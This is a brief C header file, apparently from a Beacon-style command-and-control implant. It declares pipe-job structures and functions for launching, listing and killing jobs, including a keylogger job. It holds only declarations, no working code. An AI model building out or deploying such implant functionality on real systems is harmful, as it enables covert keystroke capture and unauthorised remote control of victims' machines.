#pragma once
#include "Command.h"

typedef struct {
    HANDLE hReadPipe;
    STARTUPINFO si;
    HANDLE hWritePipe;
} CreatePipeJob;

CreatePipeJob createPipeJob();


BeaconJob* initialize_Beacon_Job(HANDLE hProcess, HANDLE hThread, int dwProcessId, int dwThreadId, HANDLE hReadPipe, HANDLE hWritePipe, const char* jobname);
void beacon_jobs();
void KEYLOGGEJob(int FlagsAndAttributes, char* Taskdata, int Task_size, int lasting);
void beacon_JobKill(char* Taskdata, int Task_size);